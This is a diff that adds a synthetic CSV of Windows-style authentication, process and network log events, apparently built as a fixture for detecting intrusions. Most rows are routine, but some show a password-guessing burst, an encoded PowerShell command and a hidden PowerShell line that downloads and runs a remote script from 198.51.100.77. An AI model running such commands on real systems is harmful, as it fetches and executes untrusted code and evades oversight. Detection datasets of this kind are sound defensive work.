@@ -1,0 +1,23 @@
+timestamp,source,host,user,source_ip,event
+2026-05-10 18:55:10+00:00,auth,WS-101,alice,10.10.5.20,4624 logon success (Normal workstation login)
+2026-05-10 18:56:03+00:00,endpoint,WS-101,alice,,4688 process=chrome.exe parent=explorer.exe command=C:\Program Files\Google\Chrome\Application\chrome.exe
+2026-05-10 18:57:01+00:00,network,WS-101,,10.10.5.20,allow TCP to 203.0.113.10:443 bytes_out=10240 category=web dns=updates.example
+2026-05-10 20:01:08+00:00,auth,SRV-DC01,svc-backup,203.0.113.40,4625 logon failure (Bad password)
+2026-05-10 20:02:14+00:00,auth,SRV-DC01,svc-backup,203.0.113.40,4625 logon failure (Bad password)
+2026-05-10 20:03:01+00:00,auth,SRV-DC01,svc-backup,203.0.113.40,4625 logon failure (Bad password)
+2026-05-10 20:04:33+00:00,auth,SRV-DC01,svc-backup,203.0.113.40,4625 logon failure (Bad password)
+2026-05-10 20:05:21+00:00,auth,SRV-DC01,svc-backup,203.0.113.40,4625 logon failure (Bad password)
+2026-05-10 20:07:02+00:00,auth,SRV-DC01,svc-backup,203.0.113.40,4624 logon success (Successful login after failures)
+2026-05-10 20:07:09+00:00,auth,SRV-DC01,svc-backup,203.0.113.40,4672 privilege success (Special privileges assigned to new logon)
+2026-05-10 20:08:30+00:00,endpoint,SRV-DC01,svc-backup,,4688 process=powershell.exe parent=cmd.exe command=powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkA
+2026-05-10 20:09:05+00:00,endpoint,SRV-DC01,svc-backup,,4688 process=whoami.exe parent=powershell.exe command=whoami /priv
+2026-05-10 20:09:41+00:00,network,SRV-DC01,,10.10.0.10,allow TCP to 203.0.113.99:443 bytes_out=89120 category=cloud-storage dns=backup-storage.example
+2026-05-11 01:16:42+00:00,auth,WS-104,bob,198.51.100.23,4624 logon success (VPN remote desktop session)
+2026-05-11 01:18:03+00:00,auth,SRV-DC01,bob,198.51.100.23,4728 account_change success (User added to privileged group)
+2026-05-11 01:20:18+00:00,endpoint,WS-104,bob,,4688 process=powershell.exe parent=explorer.exe command=powershell.exe -WindowStyle Hidden IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.77/a.ps1')
+2026-05-11 01:21:04+00:00,network,WS-104,,10.10.5.34,allow TCP to 198.51.100.77:4444 bytes_out=145232 category=unknown dns=
+2026-05-11 01:22:19+00:00,network,WS-104,,10.10.5.34,allow TCP to 198.51.100.77:8080 bytes_out=84212 category=unknown dns=cdn-cache.example
+2026-05-11 08:10:02+00:00,auth,WS-102,carol,10.10.5.51,4625 logon failure (Mistyped password)
+2026-05-11 08:11:14+00:00,auth,WS-102,carol,10.10.5.51,4624 logon success (Normal login after single failure)
+2026-05-11 08:15:00+00:00,endpoint,WS-102,carol,,4688 process=powershell.exe parent=explorer.exe command=powershell.exe Get-Process
+2026-05-11 08:20:07+00:00,network,WS-102,,10.10.5.51,allow TCP to 203.0.113.22:443 bytes_out=2234 category=business dns=hr-portal.example
